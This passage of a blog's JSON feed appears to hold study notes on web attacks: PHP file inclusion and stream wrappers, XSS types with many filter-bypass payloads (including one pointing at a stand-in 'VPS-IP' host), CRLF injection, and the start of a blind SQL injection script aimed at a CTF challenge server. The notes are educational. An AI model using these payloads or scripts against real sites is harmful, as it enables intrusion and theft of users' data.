C:\\windows\\temp</p>\n<p>因为 Linux 的随机函数有缺陷，windows 只要 65535 种情况，所以一般暴力猜解</p>\n<p>文件名</p>\n<p>也可以看 phpinfo 页面的 php variables 直接获取上传文件的存储路径和临时文件名</p>\n<p>---- 但是必须在该 PHP 文件执行结束前就完成所有操作</p>\n<h3 id=\"远程文件包含rfi\"><a class=\"anchor\" href=\"#远程文件包含rfi\">#</a> 远程文件包含（RFI）</h3>\n<p>需要配置选项 <code>allow_url_include</code>  和 <code>allow_url_fopen</code>  状态为 on</p>\n<p>反正就是可以包含其他服务器上的文件</p>\n<p>你可以用 %00 (php 版本小于 5.3.4) 或者？来截断 url</p>\n<p>（如果有需要去掉后端本身可能存在的拼接内容）</p>\n<h3 id=\"php伪协议\"><a class=\"anchor\" href=\"#php伪协议\">#</a> PHP 伪协议</h3>\n<h4 id=\"file\"><a class=\"anchor\" href=\"#file\">#</a> file://</h4>\n<p>访问本地文件，<strong>不受 allow_url_fopen/include 影响</strong></p>\n<p>需要绝对路径（包括文件名）</p>\n<h4 id=\"php\"><a class=\"anchor\" href=\"#php\">#</a> php://</h4>\n<p>访问输入输出流</p>\n<p>php://filter 读取源代码，base64 输出 (不这样会被直接执行，当你访问文件时)</p>\n<p>php://input 执行 php 代码（具体代码是请求体中的，不是 url，自己用 bp 加，需要 &lt;&gt;）</p>\n<p><strong>不受 allow_url_fopen/include 影响</strong>（input 要求 include 是 on）</p>\n<h4 id=\"zip\"><a class=\"anchor\" href=\"#zip\">#</a> ZIP://</h4>\n<p>访问压缩包里的文件，只能绝对路径</p>\n<p>分割符（分割路径和包内文件） <code>#</code> 要用 url 编码成 %23</p>\n<p><strong>不受 allow_url_fopen/include 影响</strong></p>\n<p>类似的：</p>\n<p>zlib://，bzip2://</p>\n<p><strong>无所谓后缀名</strong></p>\n<h4 id=\"data\"><a class=\"anchor\" href=\"#data\">#</a> data://</h4>\n<p>类似于 php://input，但是</p>\n<p><strong>allow_url_fopen/include 必须都是 on</strong></p>\n<p><img loading=\"lazy\" data-src=\"1739619725310.png\" alt=\"1739619725310\" /></p>\n",
            "tags": [
                "技术"
            ]
        },
        {
            "id": "https://zhewanyiershinicheng.github.io/2025/02/05/XSS/",
            "url": "https://zhewanyiershinicheng.github.io/2025/02/05/XSS/",
            "title": "XSS",
            "date_published": "2025-02-05T08:30:11.000Z",
            "content_html": "<h2 id=\"类型\"><a class=\"anchor\" href=\"#类型\">#</a> 类型</h2>\n<h3 id=\"存储型xss\"><a class=\"anchor\" href=\"#存储型xss\">#</a> 存储型 XSS</h3>\n<p>一般是将恶意代码通过交互界面上传到后端，然后从而上传到数据库中，当管理员 admin 查询数据库的信息时，恶意脚本又从后端到了前端，这也就是存储型 XSS 的数据流通。</p>\n<p>// 后端要存储到数据库中</p>\n<h4 id=\"测试\"><a class=\"anchor\" href=\"#测试\">#</a> 测试</h4>\n<p>在评论区中输入 &lt;script&gt;alert (1)&lt;/script &gt; 能够成功弹窗</p>\n<h3 id=\"反射型xss\"><a class=\"anchor\" href=\"#反射型xss\">#</a> 反射型 XSS</h3>\n<p>需要欺骗用户自己去点击链接才能触发 XSS 代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。大多数是用来盗取用户的 Cookie 信息。</p>\n<p>// 前端显示了我们的输入</p>\n<blockquote>\n<p>例如</p>\n<p>&lt;p&gt; 您好，&lt;?php echo $_GET ['name']; ?&gt;！&lt;/p&gt;</p>\n</blockquote>\n<h4 id=\"测试-2\"><a class=\"anchor\" href=\"#测试-2\">#</a> 测试</h4>\n<p>同上输入</p>\n<h3 id=\"dom型xss\"><a class=\"anchor\" href=\"#dom型xss\">#</a> DOM 型 XSS</h3>\n<p>在前端 url 添加我们的恶意脚本，然后直接在页面输出了</p>\n<p>// 前端通过 javascript 直接输出了我们的输入</p>\n<h4 id=\"测试-3\"><a class=\"anchor\" href=\"#测试-3\">#</a> 测试</h4>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>xxxx/?name=<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><h2 id=\"对象\"><a class=\"anchor\" href=\"#对象\">#</a> 对象</h2>\n<h3 id=\"注释\"><a class=\"anchor\" href=\"#注释\">#</a> 注释</h3>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">&lt;!-- </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>&lt;script></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  alert ('XSS 攻击成功！');</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>&lt;/script></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>--></span></pre></td></tr></table></figure><h3 id=\"标签属性\"><a class=\"anchor\" href=\"#标签属性\">#</a> 标签属性</h3>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>image.png<span class=\"token punctuation\">\"</span></span> <span class=\"token special-attr\"><span class=\"token attr-name\">onerror</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value javascript language-javascript\"><span class=\"token operator\">&lt;</span>script<span class=\"token operator\">></span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token string\">'potatowo'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span></span><span class=\"token punctuation\">\"</span></span></span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><h3 id=\"标签属性名\"><a class=\"anchor\" href=\"#标签属性名\">#</a> 标签属性名</h3>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text<span class=\"token punctuation\">\"</span></span> <span class=\"token special-attr\"><span class=\"token attr-name\">onclick</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value javascript language-javascript\"><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Evi1s7'</span><span class=\"token punctuation\">)</span></span><span class=\"token punctuation\">\"</span></span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>>&lt;script>alert('XSS攻击成功！')&lt;/script><span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><h3 id=\"标签名\"><a class=\"anchor\" href=\"#标签名\">#</a> 标签名</h3>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>&lt;<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token string\">'potatowo'</span><span class=\"token punctuation\">)</span></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span>img src=\"image.png\"></pre></td></tr></table></figure><h3 id=\"css\"><a class=\"anchor\" href=\"#css\">#</a> CSS</h3>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token special-attr\"><span class=\"token attr-name\">style</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value css language-css\"><span class=\"token property\">background-image</span><span class=\"token punctuation\">:</span><span class=\"token url\"><span class=\"token function\">url</span><span class=\"token punctuation\">(</span><span class=\"token string url\">'javascript:alert(`Evi1s7`)'</span><span class=\"token punctuation\">)</span></span><span class=\"token punctuation\">;</span></span><span class=\"token punctuation\">\"</span></span></span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><h3 id=\"http响应\"><a class=\"anchor\" href=\"#http响应\">#</a> HTTP 响应</h3>\n<p>？？</p>\n<blockquote>\n<p>在 HTTP 协议中，CRLF 被用来分隔 HTTP 请求和响应中的各个部分。</p>\n<p>CRLF 漏洞（ HTTP 报头注入漏洞），攻击者可以利用这个漏洞向 HTTP 响应中注入任意的 HTTP 头或者响应体，一般攻击者可以通过在输入中注入 CRLF 字符来改变 HTTP 响应的内容，从而实现恶意操作。</p>\n<p>比如一个 GET 传参</p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">exp</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">?key=aaa</span></span></pre></td></tr></table></figure><p>如果存在 CRLF 漏洞，那么就可以：</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?key=%0d%0a%0d%0a<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>1</span> <span class=\"token special-attr\"><span class=\"token attr-name\">onerror</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token value javascript language-javascript\"><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></span></span></span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>利用 CRLF 漏洞将 http 包分为 header 和 body，进而执行 body 中的代码，实现 XSS</p>\n<p>可以在 httpheader 中注入 X-XSS-Protection:0 来绕过浏览器的过滤规则</p>\n</blockquote>\n<h2 id=\"绕过\"><a class=\"anchor\" href=\"#绕过\">#</a> 绕过</h2>\n<h3 id=\"关键词绕过\"><a class=\"anchor\" href=\"#关键词绕过\">#</a> 关键词绕过</h3>\n<h4 id=\"1大小写绕过\"><a class=\"anchor\" href=\"#1大小写绕过\">#</a> 1. 大小写绕过</h4>\n<p>源代码中用了 strtolower () 等函数</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>xxx?q=<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>sCriPt</span><span class=\"token punctuation\">></span></span>alert(1)<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>sCriPt</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><h4 id=\"2拼接绕过\"><a class=\"anchor\" href=\"#2拼接绕过\">#</a> 2. 拼接绕过</h4>\n<h5 id=\"21-eval\"><a class=\"anchor\" href=\"#21-eval\">#</a> 2.1 eval</h5>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">eval</span><span class=\"token punctuation\">(</span><span class=\"token string\">'al'</span><span class=\"token operator\">+</span><span class=\"token string\">'ert(1)'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h5 id=\"22-top\"><a class=\"anchor\" href=\"#22-top\">#</a> 2.2 top</h5>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>top<span class=\"token punctuation\">[</span><span class=\"token string\">'al'</span><span class=\"token operator\">+</span><span class=\"token string\">'ert'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h5 id=\"23-window\"><a class=\"anchor\" href=\"#23-window\">#</a> 2.3 window</h5>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>top<span class=\"token punctuation\">[</span><span class=\"token string\">'al'</span><span class=\"token operator\">+</span><span class=\"token string\">'ert'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h5 id=\"24-self\"><a class=\"anchor\" href=\"#24-self\">#</a> 2.4 self</h5>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>self<span class=\"token punctuation\">[</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">al</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token operator\">+</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">ert</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h5 id=\"25-parent\"><a class=\"anchor\" href=\"#25-parent\">#</a> 2.5 parent</h5>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>parent<span class=\"token punctuation\">[</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">al</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token operator\">+</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">ert</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h5 id=\"26-frames\"><a class=\"anchor\" href=\"#26-frames\">#</a> 2.6 frames</h5>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>frames<span class=\"token punctuation\">[</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">al</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token operator\">+</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">ert</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h4 id=\"3函数替换\"><a class=\"anchor\" href=\"#3函数替换\">#</a> 3. 函数替换</h4>\n<pre><code>eval(alert(1))\n</code></pre>\n<pre><code>open(alert(1))\n</code></pre>\n<pre><code>document.write(alert(1))\n</code></pre>\n<p>此外还有：</p>\n<p>setTimeout()</p>\n<p>setInterval()</p>\n<p>Set.constructor()</p>\n<p>Map.constructor()</p>\n<p>Array.constructor()</p>\n<p>WeakSet.constructor()</p>\n<p>[1].map()</p>\n<p>[1].find()</p>\n<p>[1].every()</p>\n<p>[1].fliter()</p>\n<p>[1].forEach()</p>\n<p>[1].findIndex()</p>\n<h4 id=\"4嵌套绕过\"><a class=\"anchor\" href=\"#4嵌套绕过\">#</a> 4. 嵌套绕过</h4>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>&lt;sc<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">ript<span class=\"token operator\">></span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Evi1s7'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>sc</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span>ript></pre></td></tr></table></figure><h4 id=\"5赋值绕过\"><a class=\"anchor\" href=\"#5赋值绕过\">#</a> 5. 赋值绕过</h4>\n<blockquote>\n<pre><code>&lt;img src onerror=_=alert,_(1)&gt;\n&lt;img src x=al y=ert onerror=top[x+y](1)&gt;\n&lt;img src x=al y=ert onerror=window[x+y](1)&gt; #在网页没有嵌套框架时才有效。\n&lt;img src onerror=top[a='al',b='ev',b+a]('alert(1)')&gt;\n&lt;img src onerror=['ale'+'rt'].map(top['ev'+'al'])[0]['valu'+'eOf']()(1)&gt;\n</code></pre>\n</blockquote>\n<p>看不懂是这样的</p>\n<h3 id=\"编码绕过\"><a class=\"anchor\" href=\"#编码绕过\">#</a> 编码绕过</h3>\n<h4 id=\"1html实体编码转义\"><a class=\"anchor\" href=\"#1html实体编码转义\">#</a> <strong>1.html 实体编码转义</strong></h4>\n<pre><code>&lt;a href=javascript:alert(1)&gt;aaa&lt;/a&gt;\n</code></pre>\n<p>改成（填充 0）</p>\n<pre><code>&lt;a href=&amp;#x006a&amp;#x0061&amp;#x0076&amp;#x0061&amp;#x0073&amp;#x0063&amp;#x0072&amp;#x0069&amp;#x0070&amp;#x0074&amp;#x003a&amp;#x0061&amp;#x006c&amp;#x0065&amp;#x0072&amp;#x0074&amp;#x0028&amp;#x0031&amp;#x0029&gt;aaa&lt;/a&gt;\n</code></pre>\n<h4 id=\"2url编码绕过\"><a class=\"anchor\" href=\"#2url编码绕过\">#</a> <strong>2.url 编码绕过</strong></h4>\n<p>存在 href 属性或者 src 属性，才可以利用 url 编码转义</p>\n<p>注意：在 url 解析过程中，不能对协议类型进行任何的编码操作</p>\n<pre><code>&lt;a href=javascript:alert(1)&gt;Evi1s7&lt;/a&gt;\n</code></pre>\n<p>改成</p>\n<pre><code>&lt;a href=javascript:%61%6c%65%72%74%28%31%29&gt;Evi1s7&lt;/a&gt;\n</code></pre>\n<p>src:&lt;script&gt;&lt;img&gt;&lt;iframe&gt;&lt;audio&gt;&lt;video&gt;</p>\n<p>href:&lt;a&gt;&lt;link&gt;&lt;base&gt;&lt;area&gt;</p>\n<h4 id=\"3空格绕过\"><a class=\"anchor\" href=\"#3空格绕过\">#</a> 3. 空格绕过</h4>\n<blockquote>\n<p>在 html 的标签中的不同位置的空格绕过方式不是一样的</p>\n<pre><code>&lt;html&gt;&lt;imgAAsrcAAonerrorBB=BBalertCC(1)DD&lt;/html&gt;\n</code></pre>\n<p>A 位置： /，/123/，%09，%0A，%0C，%0D，%20</p>\n<p>B 位置：%09，%0A，%0C，%0D，%20</p>\n<p>C 位置：%0B，/**/ （如果加了双引号，则可以填充 %09，%0A，%0C，%0D，%20）</p>\n<p>D 位置：%09，%0A，%0C，%0D，%20，//，&gt;</p>\n</blockquote>\n<h3 id=\"4绕过\"><a class=\"anchor\" href=\"#4绕过\">#</a> 4.() 绕过</h3>\n<h4 id=\"1利用反引号\"><a class=\"anchor\" href=\"#1利用反引号\">#</a> <strong>1. 利用反引号</strong></h4>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">alert<span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">1</span><span class=\"token template-punctuation string\">`</span></span></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><h4 id=\"2throw绕过\"><a class=\"anchor\" href=\"#2throw绕过\">#</a> <strong>2.throw 绕过</strong></h4>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">alert<span class=\"token punctuation\">;</span><span class=\"token keyword\">throw</span> <span class=\"token number\">1</span></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>&lt;svg/onload=\"window.onerror=eval;throw'=alert\\x281\\x29';\"></pre></td></tr></table></figure><h3 id=\"5单引号过滤\"><a class=\"anchor\" href=\"#5单引号过滤\">#</a> 5. 单引号过滤</h3>\n<p>使用 <code>/</code>  或者 ` 替代</p>\n<h3 id=\"6alert过滤绕过\"><a class=\"anchor\" href=\"#6alert过滤绕过\">#</a> 6.alert 过滤绕过</h3>\n<p>prompt() / confirm() / console.log() /  document.write()</p>\n<p>或者利用编码绕过</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>x</span> <span class=\"token special-attr\"><span class=\"token attr-name\">onerror</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value javascript language-javascript\">Function<span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">a</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">$&#123;</span>atob<span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">YWxlcnQoMSk=</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token interpolation-punctuation punctuation\">&#125;</span></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token template-punctuation string\">`</span></span></span><span class=\"token punctuation\">\"</span></span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>#alert(1)</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>javascript:%61%6c%65%72%74%28%31%29</span><span class=\"token punctuation\">></span></span>aaa<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>#alert(1)</pre></td></tr></table></figure><h3 id=\"7长度限制\"><a class=\"anchor\" href=\"#7长度限制\">#</a> 7. 长度限制</h3>\n<p>拆分法</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">a<span class=\"token operator\">=</span><span class=\"token string\">'document.write(\"'</span></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">a<span class=\"token operator\">=</span>a<span class=\"token operator\">+</span><span class=\"token string\">'&lt;a href=ht'</span></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">a<span class=\"token operator\">=</span>a<span class=\"token operator\">+</span><span class=\"token string\">'tp://VPS-IP:po'</span></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">a<span class=\"token operator\">=</span>a<span class=\"token operator\">+</span><span class=\"token string\">'rt>Evi1s7&lt;/a>\")'</span></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"><span class=\"token function\">eval</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>利用 eval () 函数将字符串解析为可执行的代码，从而进行拼接</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>document.write(\"<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>http://VPS-IP:port</span><span class=\"token punctuation\">></span></span>Evi1s7<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span>\")</pre></td></tr></table></figure><h3 id=\"8分号绕过\"><a class=\"anchor\" href=\"#8分号绕过\">#</a> 8. 分号绕过</h3>\n<p>换成 {}</p>\n",
            "tags": [
                "技术"
            ]
        },
        {
            "id": "https://zhewanyiershinicheng.github.io/2025/02/04/SQL%E6%B3%A8%E5%85%A5/",
            "url": "https://zhewanyiershinicheng.github.io/2025/02/04/SQL%E6%B3%A8%E5%85%A5/",
            "title": "SQL注入",
            "date_published": "2025-02-04T14:21:23.000Z",
            "content_html": "<h2 id=\"重要的玩意儿\"><a class=\"anchor\" href=\"#重要的玩意儿\">#</a> 重要的玩意儿</h2>\n<p>注入一定要注释后面的，使用 <code>--</code>  时注意前后要空格，要不然滚去用 <code>#</code></p>\n<p><code>information_schema.tables</code>  是自带的数据库</p>\n<p>其中有三个表，分别是：</p>\n<p>1. <code>schemata</code></p>\n<p>其中只有一个字段</p>\n<p><strong> <code>schemata_name</code> \t存放所有库的库名</strong></p>\n<p>2. <code>tables</code></p>\n<p>俩字段</p>\n<p><code>tables_schema</code> \t存放所有库的库名</p>\n<p><strong> <code>table_name</code> \t存放所有表名</strong></p>\n<p>3. <code>column</code></p>\n<p>三个字段，前两个同 tables（完全一样，不用改名）</p>\n<p><code>column_name</code> \t存放所有的字段名</p>\n<h2 id=\"直接套用\"><a class=\"anchor\" href=\"#直接套用\">#</a> 直接套用</h2>\n<p>都是使用二分法来找</p>\n<h3 id=\"时间盲注\"><a class=\"anchor\" href=\"#时间盲注\">#</a> 时间盲注</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 目标 URL</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">'http://challenge.ctf.rois.team:30181/'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># 提取表名</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">extract_table_name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    result <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    table_index <span class=\"token operator\">=</span> <span class=\"token number\">0</span>  <span class=\"token comment\"># 表的索引，从 0 开始</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        char_index <span class=\"token operator\">=</span> <span class=\"token number\">1</span>  <span class=\"token comment\"># 字符的索引，从 1 开始</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        current_table <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            head <span class=\"token 